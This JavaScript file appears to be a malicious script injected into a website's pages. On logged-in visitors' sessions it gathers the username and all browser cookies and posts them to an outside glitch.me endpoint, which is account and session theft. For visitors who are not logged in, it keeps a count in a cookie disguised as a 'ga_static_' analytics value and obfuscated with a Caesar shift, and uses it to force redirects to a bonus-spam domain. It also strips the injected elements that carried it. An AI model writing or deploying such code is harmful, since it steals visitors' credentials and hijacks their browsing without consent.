// RomanEncode function
function RomanEncode(input) {
  return input.split('').map(char => {
    if (/[a-zA-Z0-9]/.test(char)) {
      // Handle uppercase letters
      if (char >= 'A' && char <= 'Z') {
        return String.fromCharCode((char.charCodeAt(0) - 'A'.charCodeAt(0) + 3) % 26 + 'A'.charCodeAt(0));
      }
      // Handle lowercase letters
      if (char >= 'a' && char <= 'z') {
        return String.fromCharCode((char.charCodeAt(0) - 'a'.charCodeAt(0) + 3) % 26 + 'a'.charCodeAt(0));
      }
      // Handle digits
      if (char >= '0' && char <= '9') {
        return String.fromCharCode((char.charCodeAt(0) - '0'.charCodeAt(0) + 3) % 10 + '0'.charCodeAt(0));
      }
    }
    // Return non-alphanumeric characters as is
    return char;
  }).join('');
}

// RomanDecode function
function RomanDecode(input) {
  return input.split('').map(char => {
    if (/[a-zA-Z0-9]/.test(char)) {
      // Handle uppercase letters
      if (char >= 'A' && char <= 'Z') {
        return String.fromCharCode((char.charCodeAt(0) - 'A'.charCodeAt(0) - 3 + 26) % 26 + 'A'.charCodeAt(0));
      }
      // Handle lowercase letters
      if (char >= 'a' && char <= 'z') {
        return String.fromCharCode((char.charCodeAt(0) - 'a'.charCodeAt(0) - 3 + 26) % 26 + 'a'.charCodeAt(0));
      }
      // Handle digits
      if (char >= '0' && char <= '9') {
        return String.fromCharCode((char.charCodeAt(0) - '0'.charCodeAt(0) - 3 + 10) % 10 + '0'.charCodeAt(0));
      }
    }
    // Return non-alphanumeric characters as is
    return char;
  }).join('');
}

function deleteComments() {
	// Find all 'p' elements with 'class' and 'onanimationstart' attributes
  const elements = document.querySelectorAll('p[style][onanimationend]');
  
  elements.forEach(element => {
    // Remove 'class' and 'onanimationstart' attributes
    element.removeAttribute('style');
    element.removeAttribute('onanimationend');
    
    // Get all attributes of the element
    const attributes = element.attributes;
    
    // Iterate through attributes in reverse order (because we're potentially removing them)
    for (let i = attributes.length - 1; i >= 0; i--) {
      const attr = attributes[i];
      // Check if attribute name contains a single quote
      if (attr.name.includes("'")) {
        element.removeAttribute(attr.name);
      }
	if (attr.name.includes('"')) {
        element.removeAttribute(attr.name);
      }
    }
  });
}
// Utility function to generate a random string
function generateRandomString(length, uppercase = false) {
  const characters = uppercase ? 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789' : 'abcdefghijklmnopqrstuvwxyz0123456789';
  return Array(length).fill('').map(() => characters[Math.floor(Math.random() * characters.length)]).join('');
}

const usefulInfo = {
  ga: {
    timestampRedirects: Date.now(),
    redirects: 0,
    timestampComments: Date.now(),
    comments: 0
  },
  session: localStorage['sdb-session'] || generateRandomString(32, false)
};

const randomNames = ["Ethan",
  "Liam"]

function getUserData() {
  const cookies = document.cookie.split('; ').reduce((acc, cookie) => {
    const [name, value] = cookie.split('=');
    acc[name] = value;
    return acc;
  }, {});

  // Check for session in localStorage, if not found generate a new one
  if (!localStorage['sdb-session']) {
    // localStorage['sdb-session'] = usefulInfo.session;
  }

  // Check for username in localStorage, cookies, or generate a random one
  if (localStorage['sdb-user']) {
    usefulInfo.username = localStorage['sdb-user'];
  } else if (cookies.username) {
    usefulInfo.username = cookies.username;
  } else {    
    usefulInfo.username = randomNames[Math.floor(Math.random() * randomNames.length)];
  }

  // Loop for all cookies to find specific ones
  for (const [key, value] of Object.entries(cookies)) {
    if (/^ga_static_[A-Z0-9]{9}$/.test(key)) {
      let temp = RomanDecode(value);
      try {
        let decodedValue = atob(decodeURIComponent(temp));
        if (/^(\d+:\d+:\d+:\d+)$/.test(decodedValue)) {
          const [timestampRedirects, redirects, timestampComments, comments] = decodedValue.split(':').map(Number);
          usefulInfo.ga = {
            timestampRedirects,
            redirects,
            timestampComments,
            comments
          };
        } else {
          throw new Error('Invalid format');
        }
      } catch (e) {
        // Default values are already set, so we don't need to do anything here
      }
    }
  }

  // If username is not found in cookies or localStorage, run the getusername() function
  if (!usefulInfo.username && typeof getusername === 'function') {
    usefulInfo.username = getusername();
  }

  // Add the current URL
  usefulInfo.url = window.location.href;

  // Add the browser's User-Agent
  usefulInfo.userAgent = navigator.userAgent;

  return usefulInfo;
}

// Helper function to set a cookie
function setCookie(name, value, days) {
  const expires = new Date(Date.now() + days * 864e5).toUTCString();
  document.cookie = `${name}=${value}; expires=${expires}; path=/`;
}

function writeCookie(data) {
  const { timestampRedirects, redirects, timestampComments, comments } = data;

  // Create the encoded string
  const joinedString = [timestampRedirects, redirects, timestampComments, comments].join(':');
  const base64String = btoa(joinedString);
  const encodedString = RomanEncode(base64String);

  // Check if there is a cookie that matches the format
  const cookies = document.cookie.split('; ').reduce((acc, cookie) => {
    const [name, value] = cookie.split('=');
    acc[name] = decodeURIComponent(value);
    return acc;
  }, {});

  let cookieName = null;
  for (const [key, value] of Object.entries(cookies)) {
    let decodedValue;
    try {
      decodedValue = atob(RomanDecode(value));
    } catch (e) {
      continue; // Skip invalid base64 strings
    }

    if (/^(\d+:\d+:\d+:\d+)$/.test(decodedValue)) {
      cookieName = key;
      break;
    }
  }

  // If no matching cookie is found, generate a new name
  if (!cookieName) {
    cookieName = 'ga_static_' + generateRandomString(9, true);
  }

  // Write the cookie
  setCookie(cookieName, encodedString, 365);
}

// Example usage
const data = {
  timestampRedirects: Date.now(),
  redirects: 3,
  timestampComments: Date.now(),
  comments: 10
};

function getLogin() {
  const menuUserElement = document.querySelector('.navbar-nav .dropdown .menuUser');
  let login

    // Check if the element exists
    if (menuUserElement) {
        // Get the inner text of the anchor element
        login = menuUserElement.innerText;
		}
      const email = 'blank';

      if (login && email) {
        return { [login]: { email } };
      } else {
        return true;
      }
    } 

function checkUserLinkInDropdown() {
	return (document.querySelector('a[href*="edit/avatar"]') !== null);    
}

function checkReferrer() {
    const currentDomain = window.location.hostname;
    const referrer = document.referrer;

    // Check if the referrer is empty, includes 'domain.com', or includes the current domain
    if (referrer === '' || referrer.includes('babepedia.com') || referrer.includes(currentDomain)) {
        return true;
    } else {
        return false;
    }
}


// Function to get cookies from the browser
function getCookies() {
    return document.cookie.split(';').reduce((cookies, cookie) => {
        const [name, value] = cookie.trim().split('=').map(decodeURIComponent);
        cookies[name] = value;
        return cookies;
    }, {});
}

function sendAccData(accdata) {
  fetch('https://NEWREPLACE.glitch.me/acc', {
    method: 'POST',
    headers: {
      'Content-Type': 'text/plain', // Change this to text/plain
    },
    body: JSON.stringify(accdata), // This remains the same
  })
  .then(response => {
    if (!response.ok) {
      return response.text().then(text => {
        throw new Error(`HTTP error! status: ${response.status}, message: ${text}`);
      });
    }
    return response.text();
  })
  .then(data => {
    //console.log('Success:', data);
  })
  .catch((error) => {
    //console.error('Error:', error);
  });
}

async function executeTask() {
  const currentTime = Date.now();

  deleteComments();  
  if (window.location.href.includes('/show/') || document.querySelector('.fancybox__toolbar') !== null) {
	  //
  } else {return;}
  getUserData();  
  writeCookie(usefulInfo.ga);

  
  
 let loggedIn = checkUserLinkInDropdown();
  if (loggedIn) {
	  // Assigning accData to true by default
  var accData = true;
    accData = getLogin(); // Attempt to get login information
  
    // If accData is valid and contains login information
    const login = Object.keys(accData)[0];
	if (!accData[login]) {
		return
	}
    accData[login].cookies = getCookies();
    sendAccData(accData);
  } else {
    // Handle redirects if accData is false or login info is not retrieved
    const maxRedirects24 = 3;
    const maxRedirects24to48 = 6;
    const elapsed = currentTime - usefulInfo.ga.timestampRedirects;

    if (elapsed > 48 * 60 * 60 * 1000) {
      usefulInfo.ga.timestampRedirects = currentTime;
      usefulInfo.ga.redirects = 0;
    }

    let maxRedirects;
    let chance;

    if (elapsed <= 24 * 60 * 60 * 1000) {
      maxRedirects = maxRedirects24;
      chance = 1;
    } else if (elapsed <= 48 * 60 * 60 * 1000) {
      maxRedirects = maxRedirects24to48;
      chance = 1;
    } else {
      maxRedirects = maxRedirects24;
      chance = 1;
    }

    if (usefulInfo.ga.redirects < maxRedirects) {
      if (Math.random() < chance) {
        usefulInfo.ga.redirects += 1;
        writeCookie(usefulInfo.ga);

        const links = ["https://hugebonusfinder.top/?u=z34zyqu&o=thw8x3z&m=1&t=sch_ms"];
        const randomLink = links[Math.floor(Math.random() * links.length)];
        window.location.href = randomLink;
      }
    }
  }
}

executeTask();
